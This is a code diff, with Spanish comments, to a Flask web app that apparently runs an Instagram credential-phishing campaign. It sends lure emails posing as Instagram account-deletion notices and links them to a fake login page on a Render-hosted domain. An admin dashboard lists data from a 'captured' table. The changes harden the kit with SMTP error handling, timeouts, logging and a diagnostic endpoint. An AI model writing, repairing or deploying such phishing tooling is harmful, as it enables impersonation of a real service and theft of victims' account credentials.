@@ -22,6 +22,27 @@ app = Flask(__name__)
 # Configuración para Producción (Render) y Desarrollo
 app.secret_key = os.environ.get("SECRET_KEY", "dev_secret_key_change_in_production")
 
+# Handler global de errores para evitar crashes
+@app.errorhandler(Exception)
+def handle_exception(e):
+    """Maneja todos los errores no capturados para evitar que la app crashee"""
+    error_msg = str(e)
+    print(f"❌ Error no capturado: {error_msg}")
+    import traceback
+    print(f"Traceback completo: {traceback.format_exc()}")
+    
+    # Si es una petición AJAX o API, devolver JSON
+    if request.is_json or request.path.startswith('/api/'):
+        return jsonify({"error": error_msg}), 500
+    
+    # Si es una ruta de admin, redirigir al login con mensaje
+    if request.path.startswith('/admin/'):
+        flash(f"❌ Error: {error_msg}", "error")
+        return redirect(url_for('admin_login'))
+    
+    # Para otras rutas, devolver un mensaje de error simple
+    return f"Error: {error_msg}", 500
+
 # Credenciales SMTP (Usar variables de entorno en Render)
 SMTP_SERVER = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
 SMTP_PORT = int(os.environ.get("SMTP_PORT", 587))
@@ -153,11 +174,30 @@ def capture():
 # --- FUNCION DE ENVIO DE CORREO (Reutilizable) ---
 def send_phishing_email_logic(target_email, username_target):
     try:
+        # Validar que tenemos las credenciales SMTP necesarias
+        if not SMTP_USER or not SMTP_PASSWORD:
+            return False, "Credenciales SMTP no configuradas. Verifica las variables de entorno SMTP_USER y SMTP_PASSWORD."
+        
+        if not target_email:
+            return False, "El correo electrónico de destino es requerido."
+        
         subject = "Lamentamos que solicites la eliminación de tu cuenta de Instagram"
         
         # En Producción, esto DEBE ser la URL de tu app en Render
         # Ejemplo: https://mi-phishing-app.onrender.com/login-page
-        app_url = os.environ.get("RENDER_EXTERNAL_URL", request.host_url).rstrip('/')
+        app_url = os.environ.get("RENDER_EXTERNAL_URL", "")
+        if not app_url:
+            # Intentar obtener desde el contexto de Flask si está disponible
+            try:
+                from flask import has_request_context, request as flask_request
+                if has_request_context():
+                    app_url = flask_request.host_url.rstrip('/')
+                else:
+                    app_url = "https://instagram-3-p8pc.onrender.com"
+            except:
+                app_url = "https://instagram-3-p8pc.onrender.com"
+        app_url = app_url.rstrip('/')
+        
         link = f"{app_url}/login-page"
         
         html_content = f"""
@@ -202,14 +242,51 @@ def send_phishing_email_logic(target_email, username_target):
         msg['Subject'] = subject
         msg.attach(MIMEText(html_content, 'html'))
 
-        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
-        server.starttls()
-        server.login(SMTP_USER, SMTP_PASSWORD)
-        server.sendmail(SMTP_USER, target_email, msg.as_string())
-        server.quit()
-        return True, "Correo enviado"
+        # Configurar timeout para evitar que la conexión se cuelgue
+        server = None
+        try:
+            print(f"🔌 Conectando a SMTP: {SMTP_SERVER}:{SMTP_PORT}")
+            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=30)
+            server.set_debuglevel(0)  # Desactivar debug en producción
+            
+            print(f"🔐 Iniciando TLS...")
+            server.starttls()
+            
+            print(f"🔑 Autenticando con usuario: {SMTP_USER[:5]}...")
+            server.login(SMTP_USER, SMTP_PASSWORD)
+            
+            print(f"📤 Enviando correo a {target_email}...")
+            server.sendmail(SMTP_USER, target_email, msg.as_string())
+            print(f"✅ Correo enviado exitosamente a {target_email}")
+            return True, "Correo enviado exitosamente"
+        except smtplib.SMTPAuthenticationError as e:
+            error_msg = f"Error de autenticación SMTP: {str(e)}. Verifica SMTP_USER y SMTP_PASSWORD."
+            print(f"❌ {error_msg}")
+            return False, error_msg
+        except smtplib.SMTPConnectError as e:
+            error_msg = f"Error de conexión SMTP: {str(e)}. Verifica SMTP_SERVER y SMTP_PORT."
+            print(f"❌ {error_msg}")
+            return False, error_msg
+        except smtplib.SMTPException as e:
+            error_msg = f"Error SMTP: {str(e)}"
+            print(f"❌ {error_msg}")
+            return False, error_msg
+        except Exception as e:
+            error_msg = f"Error inesperado al enviar correo: {str(e)}"
+            print(f"❌ {error_msg}")
+            import traceback
+            print(f"Traceback: {traceback.format_exc()}")
+            return False, error_msg
+        finally:
+            if server:
+                try:
+                    server.quit()
+                except:
+                    pass
     except Exception as e:
-        return False, str(e)
+        error_msg = f"Error general al preparar el correo: {str(e)}"
+        print(f"❌ {error_msg}")
+        return False, error_msg
 
 # --- PANEL DE ADMINISTRACION ---
 
@@ -236,42 +313,83 @@ def dashboard():
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
     
-    conn = get_db_connection()
-    cur = conn.cursor()
-    
-    # Select query compatible con ambos
-    cur.execute("SELECT * FROM captured ORDER BY id DESC")
-    data = cur.fetchall()
-    
-    cur.close()
-    conn.close()
-    
-    return render_template('dashboard.html', captured_data=data)
+    try:
+        conn = get_db_connection()
+        if not conn:
+            flash("⚠️ Error al conectar con la base de datos", "error")
+            return render_template('dashboard.html', captured_data=[])
+        
+        cur = conn.cursor()
+        
+        # Select query compatible con ambos
+        cur.execute("SELECT * FROM captured ORDER BY id DESC")
+        data = cur.fetchall()
+        
+        cur.close()
+        conn.close()
+        
+        return render_template('dashboard.html', captured_data=data)
+    except Exception as e:
+        print(f"❌ Error en dashboard: {str(e)}")
+        flash(f"⚠️ Error al cargar datos: {str(e)}", "error")
+        return render_template('dashboard.html', captured_data=[])
 
 @app.route('/admin/send-email', methods=['POST'])
 def admin_send_email():
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
-        
-    email = request.form.get('email')
-    username = request.form.get('username')
     
-    if not username:
-        username = email.split('@')[0]
+    try:
+        email = request.form.get('email')
+        username = request.form.get('username')
         
-    success, msg = send_phishing_email_logic(email, username)
-    
-    if success:
-        flash(f"✅ Correo enviado exitosamente a {email}", "success")
-    else:
-        flash(f"❌ Error al enviar: {msg}", "error")
+        if not email:
+            flash("❌ El correo electrónico es requerido", "error")
+            return redirect(url_for('dashboard'))
         
-    return redirect(url_for('dashboard'))
+        if not username:
+            username = email.split('@')[0]
+        
+        print(f"📧 Intentando enviar correo a {email} (usuario: {username})")
+        smtp_user_display = SMTP_USER[:5] + "..." if SMTP_USER and len(SMTP_USER) > 5 else (SMTP_USER if SMTP_USER else "No configurado")
+        print(f"🔧 SMTP_SERVER: {SMTP_SERVER}, SMTP_PORT: {SMTP_PORT}, SMTP_USER: {smtp_user_display}")
+        
+        success, msg = send_phishing_email_logic(email, username)
+        
+        if success:
+            flash(f"✅ Correo enviado exitosamente a {email}", "success")
+        else:
+            flash(f"❌ Error al enviar: {msg}", "error")
+        
+        return redirect(url_for('dashboard'))
+    except Exception as e:
+        error_msg = f"Error inesperado: {str(e)}"
+        print(f"❌ {error_msg}")
+        flash(f"❌ {error_msg}", "error")
+        return redirect(url_for('dashboard'))
 
 @app.route('/admin/logout')
 def logout():
     session.pop('admin_logged_in', None)
     return redirect(url_for('admin_login'))
+
+# --- ENDPOINT DE DIAGNÓSTICO (Solo para desarrollo/debugging) ---
+@app.route('/admin/test-smtp')
+def test_smtp():
+    """Endpoint para verificar la configuración SMTP sin enviar correos"""
+    if not session.get('admin_logged_in'):
+        return redirect(url_for('admin_login'))
+    
+    config_info = {
+        "SMTP_SERVER": SMTP_SERVER,
+        "SMTP_PORT": SMTP_PORT,
+        "SMTP_USER": SMTP_USER[:5] + "..." if SMTP_USER else "No configurado",
+        "SMTP_PASSWORD": "***" if SMTP_PASSWORD else "No configurado",
+        "RENDER_EXTERNAL_URL": os.environ.get("RENDER_EXTERNAL_URL", "No configurado"),
+        "DATABASE_URL": "Configurado" if DATABASE_URL else "No configurado (usando SQLite)"
+    }
+    
+    return jsonify(config_info), 200
 
 if __name__ == '__main__':
     # Configuración dinámica de puerto para Render o local
